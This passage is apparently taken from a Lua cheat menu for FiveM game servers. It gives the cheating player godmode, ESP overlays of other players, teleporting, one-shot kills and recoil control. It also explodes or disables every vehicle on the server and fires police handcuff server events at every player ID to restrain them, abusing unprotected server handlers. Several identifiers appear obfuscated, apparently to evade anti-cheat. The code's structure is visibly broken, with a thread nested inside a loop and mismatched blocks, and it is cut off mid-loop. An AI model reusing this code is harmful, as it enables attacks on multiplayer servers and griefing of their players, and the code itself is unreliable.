    "WEAPON_STICKYBOMB",
    "WEAPON_PROXMINE",
    "WEAPON_BZGAS",
    "WEAPON_SMOKEGRENADE",
    "WEAPON_MOLOTOV",
    "WEAPON_FIREEXTINGUISHER",
    "WEAPON_PETROLCAN",
    "WEAPON_SNOWBALL",
    "WEAPON_FLARE",
    "WEAPON_BALL"
}

local hasdh8ay = true

function TeleportToWaypoint()
    if DoesBlipExist(GetFirstBlipInfoId(8)) then
        local blipIterator = GetBlipInfoIdIterator(8)
        local blip = GetFirstBlipInfoId(8, blipIterator)
        WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) --Thanks To Briglair [forum.FiveM.net]
        wp = true
    
    

        local zHeigt = 0.0
        height = 1000.0
        while true do
            Citizen.Wait(0)
            if wp then
                if
                    IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                        (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
                then
                    entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
                else
                    entity = GetPlayerPed(-1)
                end

                SetEntityCoords(entity, WaypointCoords.x, WaypointCoords.y, height)
                FreezeEntityPosition(entity, true)
                local Pos = GetEntityCoords(entity, true)

                if zHeigt == 0.0 then
                    height = height - 25.0
                    SetEntityCoords(entity, Pos.x, Pos.y, height)
                    bool, zHeigt = GetGroundZFor_3dCoord(Pos.x, Pos.y, Pos.z, 0)
                else
                    SetEntityCoords(entity, Pos.x, Pos.y, zHeigt)
                    FreezeEntityPosition(entity, false)
                    wp = false
                    height = 1000.0
                    zHeigt = 0.0
                    drawNotification("~g~Teleported to waypoint!")
                    break
                end
            end
        end
    else
        drawNotification("~r~No waypoint!")
    end
end

function stringsplit(inputstr, sep)
    if sep == nil then
        sep = "%s"
    end
    local t = {}
    i = 1
    for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
        t[i] = str
        i = i + 1
    end
    return t
end

local Spectating = false

function SpectatePlayer(player)
    local playerPed = PlayerPedId()
    Spectating = not Spectating
    local targetPed = GetPlayerPed(player)

    if (Spectating) then
        local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(true, targetPed)

        drawNotification("Spectating " .. GetPlayerName(player))
    else
        local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))

        RequestCollisionAtCoord(targetx, targety, targetz)
        NetworkSetInSpectatorMode(false, targetPed)

        drawNotification("Stopped Spectating " .. GetPlayerName(player))
    end
end

function ShootPlayer(player)
    local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
    SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
end

function MaxOut(veh)
                    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
                    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
                    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end
function engine(veh)
                     SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
                    


                    
end

function DelVeh(veh)
    SetEntityAsMissionEntity(Object, 1, 1)
    DeleteEntity(Object)
    SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
    DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
end

function Clean(veh)
    SetVehicleDirtLevel(veh, 15.0)
end

function Clean2(veh)
    SetVehicleDirtLevel(veh, 1.0)
end


entityEnumerator = {
    __gc = function(enum)
      if enum.destructor and enum.handle then
        enum.destructor(enum.handle)
      end
      enum.destructor = nil
      enum.handle = nil
    end
  }

function EnumerateEntities(initFunc, moveFunc, disposeFunc)
    return coroutine.wrap(function()
      local iter, id = initFunc()
      if not id or id == 0 then
        disposeFunc(iter)
        return
      end
      
      local enum = {handle = iter, destructor = disposeFunc}
      setmetatable(enum, entityEnumerator)
      
      local next = true
      repeat
        coroutine.yield(id)
        next, id = moveFunc(iter)
      until not next
      
      enum.destructor, enum.handle = nil, nil
      disposeFunc(iter)
    end)
  end

  function EnumerateObjects()
    return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
  end

  function EnumeratePeds()
    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
  end

  function EnumerateVehicles()
    return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
  end

  function EnumeratePickups()
    return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
  end

function RequestControl(entity)
    local Waiting = 0
    NetworkRequestControlOfEntity(entity)
    while not NetworkHasControlOfEntity(entity) do
        Waiting = Waiting + 100
        Citizen.Wait(100)
        if Waiting > 5000 then
            drawNotification("Hung for 5 seconds, killing to prevent issues...")
        end
    end
end

function getEntity(player)
    local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
    return entity
end

function GetInputMode()
    return Citizen.InvokeNative(0xA571D46727E2B718, 2) and "MouseAndKeyboard" or "GamePad"
end

function DrawSpecialText(m_text, showtime)
    SetTextEntry_2("STRING")
    AddTextComponentString(m_text)
    sasidha7sdasdasdTimed(showtime, 1)
end




ShowHudComponentThisFrame(14)

Citizen.CreateThread(function() 
    local headId = {}
    while true do
        Citizen.Wait(1)
        if playerBlips then
        
            for id = 0, 128 do
                if NetworkIsPlayerActive(id) and GetPlayerPed(id) ~= GetPlayerPed(-1) then
                    ped = GetPlayerPed(id)
                    blip = GetBlipFromEntity(ped)

                
                    
                    headId[id] = CreateMpGamerTag(ped, GetPlayerName( id ), false, false, "", false)
                    wantedLvl = GetPlayerWantedLevel(id)

                    
                    if wantedLvl then
                        SetMpGamerTagVisibility(headId[id], 7, true)
                        SetMpGamerTagWantedLevel(headId[id], wantedLvl)
                    else
                        SetMpGamerTagVisibility(headId[id], 7, false)
                    end

                
                    if NetworkIsPlayerTalking(id) then
                        SetMpGamerTagVisibility(headId[id], 9, true) 
                    else
                        SetMpGamerTagVisibility(headId[id], 9, false)
                    end

                    

                    if not DoesBlipExist(blip) then 
                        blip = AddBlipForEntity(ped)
                        SetBlipSprite(blip, 1)
                        ShowHeadingIndicatorOnBlip(blip, true)
                    else
                        veh = GetVehiclePedIsIn(ped, false)
                        blipSprite = GetBlipSprite(blip)
                        if not GetEntityHealth(ped) then
                            if blipSprite ~= 274 then
                                SetBlipSprite(blip, 274)
                                ShowHeadingIndicatorOnBlip(blip, false)
                            end
                        elseif veh then
                            vehClass = GetVehicleClass(veh)
                            vehModel = GetEntityModel(veh)
                            if vehClass == 15 then
                                if blipSprite ~= 422 then
                                    SetBlipSprite(blip, 422)
                                    ShowHeadingIndicatorOnBlip(blip, false) 
                                end
                            elseif vehClass == 8 then
                                if blipSprite ~= 226 then
                                    SetBlipSprite(blip, 226)
                                    ShowHeadingIndicatorOnBlip(blip, false) 
                                end
                            elseif vehClass == 16 then
                                if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra") or vehModel == GetHashKey("lazer") then
                                    if blipSprite ~= 424 then
                                        SetBlipSprite(blip, 424)
                                        ShowHeadingIndicatorOnBlip(blip, false) 
                                    end
                                elseif blipSprite ~= 423 then
                                    SetBlipSprite(blip, 423)
                                    ShowHeadingIndicatorOnBlip(blip, false)
                                end
                            elseif vehClass == 14 then
                                if blipSprite ~= 427 then
                                    SetBlipSprite(blip, 427)
                                    ShowHeadingIndicatorOnBlip(blip, false)
                                end
                            elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2") or vehModel == GetHashKey("insurgent3") then 
                                if blipSprite ~= 426 then
                                    SetBlipSprite(blip, 426)
                                    ShowHeadingIndicatorOnBlip(blip, false)
                                end
                            elseif vehModel == GetHashKey("limo2") then
                                if blipSprite ~= 460 then
                                    SetBlipSprite(blip, 460)
                                    ShowHeadingIndicatorOnBlip(blip, false)
                                end
                            elseif vehModel == GetHashKey("rhino") then
                                if blipSprite ~= 421 then
                                    SetBlipSprite(blip, 421)
                                    ShowHeadingIndicatorOnBlip(blip, false) 
                                end
                            elseif vehModel == GetHashKey("trash") or vehModel == GetHashKey("trash2") then
                                if blipSprite ~= 318 then
                                    SetBlipSprite(blip, 318)
                                    ShowHeadingIndicatorOnBlip(blip, false)
                                end
                            elseif vehModel == GetHashKey("pbus") then 
                                if blipSprite ~= 513 then
                                    SetBlipSprite(blip, 513)
                                    ShowHeadingIndicatorOnBlip(blip, false) 
                                end
                            elseif vehModel == GetHashKey("seashark") or vehModel == GetHashKey("seashark2") or vehModel == GetHashKey("seashark3") then
                                if blipSprite ~= 471 then
                                    SetBlipSprite(blip, 471)
                                    ShowHeadingIndicatorOnBlip(blip, false) 
                                end
                            elseif vehModel == GetHashKey("cargobob") or vehModel == GetHashKey("cargobob2") or vehModel == GetHashKey("cargobob3") or vehModel == GetHashKey("cargobob4") then -- Cargobobs
                                if blipSprite ~= 481 then
                                    SetBlipSprite(blip, 481)
                                    ShowHeadingIndicatorOnBlip(blip, false) 
                                end
                            elseif vehModel == GetHashKey("technical") or vehModel == GetHashKey("technical2") or vehModel == GetHashKey("technical3") then -- Technical
                                if blipSprite ~= 426 then
                                    SetBlipSprite(blip, 426)
                                    ShowHeadingIndicatorOnBlip(blip, false) 
                                end
                            elseif vehModel == GetHashKey("taxi") then 
                                if blipSprite ~= 198 then
                                    SetBlipSprite(blip, 198)
                                    ShowHeadingIndicatorOnBlip(blip, false) 
                                end
                            elseif vehModel == GetHashKey("fbi") or vehModel == GetHashKey("fbi2") or vehModel == GetHashKey("police2") or vehModel == GetHashKey("police3") -- Police Vehicles
                                or vehModel == GetHashKey("police") or vehModel == GetHashKey("sheriff2") or vehModel == GetHashKey("sheriff")
                                or vehModel == GetHashKey("policeold2") or vehModel == GetHashKey("policeold1") then
                                if blipSprite ~= 56 then
                                    SetBlipSprite(blip, 56)
                                    ShowHeadingIndicatorOnBlip(blip, false) 
                                end
                            elseif blipSprite ~= 1 then 
                                SetBlipSprite(blip, 1)
                                ShowHeadingIndicatorOnBlip(blip, true)
                            end

                            
                            passengers = GetVehicleNumberOfPassengers(veh)

                            if passengers then
                                if not IsVehicleSeatFree(veh, -1) then
                                    passengers = passengers + 1
                                end
                                ShowNumberOnBlip(blip, passengers)
                            else
                                HideNumberOnBlip(blip)
                            end
                        else
                            
                            HideNumberOnBlip(blip)
                            if blipSprite ~= 1 then
                                SetBlipSprite(blip, 1)
                                ShowHeadingIndicatorOnBlip(blip, true)
                            end
                        end
                        
                        SetBlipRotation(blip, math.ceil(GetEntityHeading(veh))) 
                        SetBlipNameToPlayerName(blip, id)
                        SetBlipScale(blip,  0.85) 

                        
                        if IsPauseMenuActive() then
                            SetBlipAlpha( blip, 255 )
                        else
                            x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                            x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(id), true))
                            distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
                            

                            if distance < 0 then
                                distance = 0
                            elseif distance > 255 then
                                distance = 255
                            end
                            SetBlipAlpha(blip, distance)
                        end
                    end
                end
            end
        else
            for id = 0, 128 do
                ped = GetPlayerPed(id)
                blip = GetBlipFromEntity(ped)
                if DoesBlipExist(blip) then
                    RemoveBlip(blip)
                end
                if IsMpGamerTagActive(headId[id]) then
                    RemoveMpGamerTag(headId[id])
                end
            end
        end
    end
end)



Citizen.CreateThread(
    function()
        while hasdh8ay do
            Citizen.Wait(0)
            SetPlayerInvincible(PlayerId(), Godmode)
            SetEntityInvincible(PlayerPedId(), Godmode)
            if SuperJump then
                SetSuperJumpThisFrame(PlayerId())
            end

            if ePunch then
                SetExplosiveMeleeThisFrame(PlayerId())
            end

            if InfStamina then
                RestorePlayerStamina(PlayerId(), 1.0)
            end

            if Invisible then
                SetEntityVisible(GetPlayerPed(-1), false, 0)
            else
                SetEntityVisible(GetPlayerPed(-1), true, 0)
                
            if(SpeedDemon) then
            if IsPedSittingInAnyVehicle(ped) then
            local veh = GetVehiclePedIsUsing(ped)
                if veh ~= nil then      
                    SetVehicleHandlingFloat(veh, "CHandlingData", "fMass", 15000000.0);
                    SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDragCoeff", 10.0);
                    SetVehicleHandlingFloat(veh, "CHandlingData", "fInitialDriveMaxFlatVel", 1000.0);
                    SetVehicleHandlingFloat(veh, "CHandlingData", "fDriveBiasFront", 0.50);
                    SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMax", 4.5);
                    SetVehicleHandlingFloat(veh, "CHandlingData", "fTractionCurveMin", 4.38);
                    SetVehicleHandlingFloat(veh, "CHandlingData", "fBrakeForce", 5.00);
                    SetVehicleHandlingFloat(veh, "CHandlingData", "fEngineDamageMult", 0.50);
                    SetVehicleHandlingFloat(veh, "CHandlingData", "fSteeringLock", 65.00);
                    SetVehicleHandlingFloat(veh, "CHandlingData", "fRollCentreHeightFront", 0.80);
                    SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(ped, false), 12.0)
                    SetVehicleEngineTorqueMultiplier(GetVehiclePedIsIn(ped, false), 6.0);
                end
            end
        end
    end

              if fastrun then
            SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49)
            SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
          else
            SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0)
            SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
          end

            if crosshair then 
                ShowHudComponentThisFrame(14)
            end

            if crosshair2 then
                ch("~r~+",0.495,0.484)
            end

            if crosshair3 then
                ch("~r~.",0.4968,0.478)
            end

            if crosshair4 then
                ch("~r~o",0.495,0.484)
            end

            if VehicleGun then
                local VehicleGunVehicle = "Freight"
                local playerPedPos = GetEntityCoords(GetPlayerPed(-1), true)
                if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
                    drawNotification("~g~Vehicle Gun hasdh8ay!~n~~w~Use The ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!")
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999, false, true)
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999)
                    if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_APPISTOL")) then
                        if IsPedShooting(GetPlayerPed(-1)) then
                            while not HasModelLoaded(GetHashKey(VehicleGunVehicle)) do
                                Citizen.Wait(0)
                                RequestModel(GetHashKey(VehicleGunVehicle))
                            end
                            local veh = CreateVehicle(GetHashKey(VehicleGunVehicle), playerPedPos.x + (5 * GetEntityForwardX(GetPlayerPed(-1))), playerPedPos.y + (5 * GetEntityForwardY(GetPlayerPed(-1))), playerPedPos.z + 2.0, GetEntityHeading(GetPlayerPed(-1)), true, true)
                            SetEntityAsNoLongerNeeded(veh)
                            SetVehicleForwardSpeed(veh, 150.0)
                        end
                    end
                end
            end

            if DeleteGun then
                local gotEntity = getEntity(PlayerId())
                if (IsPedInAnyVehicle(GetPlayerPed(-1), true) == false) then
                    drawNotification("~g~Delete Gun hasdh8ay!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!")
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999, false, true)
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_PISTOL"), 999999)
                    if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_PISTOL")) then
                        if IsPlayerFreeAiming(PlayerId()) then
                            if IsEntityAPed(gotEntity) then
                                if IsPedInAnyVehicle(gotEntity, true) then
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(GetVehiclePedIsIn(gotEntity, true), 1, 1)
                                        DeleteEntity(GetVehiclePedIsIn(gotEntity, true))
                                        SetEntityAsMissionEntity(gotEntity, 1, 1)
                                        DeleteEntity(gotEntity)
                                        drawNotification("~g~Deleted!")
                                    end
                                else
                                    if IsControlJustReleased(1, 142) then
                                        SetEntityAsMissionEntity(gotEntity, 1, 1)
                                        DeleteEntity(gotEntity)
                                        drawNotification("~g~Deleted!")
                                    end
                                end
                            else
                                if IsControlJustReleased(1, 142) then
                                    SetEntityAsMissionEntity(gotEntity, 1, 1)
                                    DeleteEntity(gotEntity)
                                    drawNotification("~g~Deleted!")
                                end
                            end
                        end
                    end
                end
            end

            if destroyvehicles then
                for vehicle in EnumerateVehicles() do
                    if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
                        NetworkRequestControlOfEntity(vehicle)
                        SetVehicleUndriveable(vehicle,true)
                        SetVehicleEngineHealth(vehicle, 100)
                    end
                end
            end
            
                        if freezeall then
                for i = 0, 128 do
                        TriggerServerEvent("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
                        TriggerServerEvent("CheckHandcuff", GetPlayerServerId(i))
                        TriggerServerEvent('cuffServer', GetPlayerServerId(i))
                        TriggerServerEvent("cuffGranted", GetPlayerServerId(i))
                        TriggerServerEvent("police:cuffGranted", GetPlayerServerId(i))
                        TriggerServerEvent('esx_handcuffs:cuffing', GetPlayerServerId(i))
                        TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(i))
                    end
                end
      
            if explodevehicles then
                for vehicle in EnumerateVehicles() do
                    if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) and (not GotTrailer or (GotTrailer and vehicle ~= TrailerHandle)) then
                        NetworkRequestControlOfEntity(vehicle)
                        NetworkExplodeVehicle(vehicle, true, true, false)
                    end
                end
            end

            if esp then
                for i = 0, 128 do
                    if i ~= PlayerId() and GetPlayerServerId(i) ~= 0 then
                        local ra = asudga76sd1(1.0)
                        local pPed = GetPlayerPed(i)
                        local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
                        local x, y, z = table.unpack(GetEntityCoords(pPed))
                        local message =
                            "~g~~h~" ..
                            GetPlayerName(i) ..
                                        "\n~h~~b~ Dist: " .. math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, false), 1)
                
                        DrawText3D(x, y, z + 1.0, message, 255, 255, 255)

                        LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                        LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                        LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                        LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                        LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                        LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                        LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

                        TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                        TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                        TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                        TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                        TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                        TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                        TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

                        ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                        ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                        ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                        ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                        ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                        ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                        ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                        ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                    end
                end
            end

Citizen.CreateThread(
    function()
                        if Oneshot then
                SetPlayerWeaponDamageModifier(PlayerId(), 100.0)
                local gotEntity = getEntity(PlayerId())
                if IsEntityAPed(gotEntity) then
                    if IsPedInAnyVehicle(gotEntity, true) then
                        if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                            if IsControlJustReleased(1, 69) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                            end
                        else
                            if IsControlJustReleased(1, 142) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                            end
                        end
                    end
                elseif IsEntityAVehicle(gotEntity) then
                    if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                        if IsControlJustReleased(1, 69) then
                            NetworkExplodeVehicle(gotEntity, true, true, 0)
                        end
                    else
                        if IsControlJustReleased(1, 142) then
                            NetworkExplodeVehicle(gotEntity, true, true, 0)
                        end
                    end
                end
            else
                SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
            end
        end)

            if recoilcontrolsystem then
                local cI = {
                    [`WEAPON_COMBATPISTOL`] = 0.5, -- COMBAT PISTOL
                    [453432689] = 1.0,
                    [3219281620] = 1.0,
                    [1593441988] = 1.0,
                    [584646201] = 1.0,
                    [2578377531] = 1.0,
                    [324215364] = 1.0,
                    [736523883] = 1.0,
                    [2024373456] = 1.0,
                    [4024951519] = 1.0,
                    [3220176749] = 1.0,
                    [961495388] = 1.0,
                    [2210333304] = 1.0,
                    [4208062921] = 1.0,
                    [2937143193] = 1.0,
                    [2634544996] = 1.0,
                    [2144741730] = 1.0,
                    [3686625920] = 1.0,
                    [487013001] = 1.0,
                    [1432025498] = 1.0,
                    [2017895192] = 1.0,
                    [3800352039] = 1.0,
                    [2640438543] = 1.0,
                    [911657153] = 1.0,
                    [100416529] = 1.0,
                    [205991906] = 1.0,
                    [177293209] = 1.0,
                    [856002082] = 1.0,
                    [2726580491] = 1.0,
                    [1305664598] = 1.0,
                    [2982836145] = 1.0,
                    [1752584910] = 1.0,
                    [1119849093] = 1.0,
                    [3218215474] = 1.0,
                    [1627465347] = 1.0,
                    [3231910285] = 1.0,
                    [-1768145561] = 1.0,
                    [3523564046] = 1.0,
                    [2132975508] = 1.0,
                    [-2066285827] = 1.0,
                    [137902532] = 1.0,
                    [2828843422] = 1.0,
                    [984333226] = 1.0,
                    [3342088282] = 1.0,
                    [1785463520] = 1.0,
                    [1672152130] = 0,
                    [1198879012] = 1.0,
                    [171789620] = 1.0,
                    [3696079510] = 1.0,
                    [1834241177] = 1.0,
                    [3675956304] = 1.0,
                    [3249783761] = 1.0,
                    [-879347409] = 1.0,
                    [4019527611] = 1.0,
                    [1649403952] = 1.0,
                    [317205821] = 1.0,
                    [125959754] = 1.0,
                    [3173288789] = 1.0
                }
                if IsPedShooting(PlayerPedId(-1)) and not IsPedDoingDriveby(PlayerPedId(-1)) then
                    local _, cJ = GetCurrentPedWeapon(PlayerPedId(-1))
                    _, cAmmo = GetAmmoInClip(PlayerPedId(-1), cJ)
                    if cI[cJ] and cI[cJ] ~= 0 then
                        tv = 0
                        if GetFollowPedCamViewMode() ~= 4 then
                            repeat
                                Wait(0)
                                p = GetGameplayCamRelativePitch()
                                SetGameplayCamRelativePitch(p + 0.0, 0.0)
                                tv = tv + 0.0
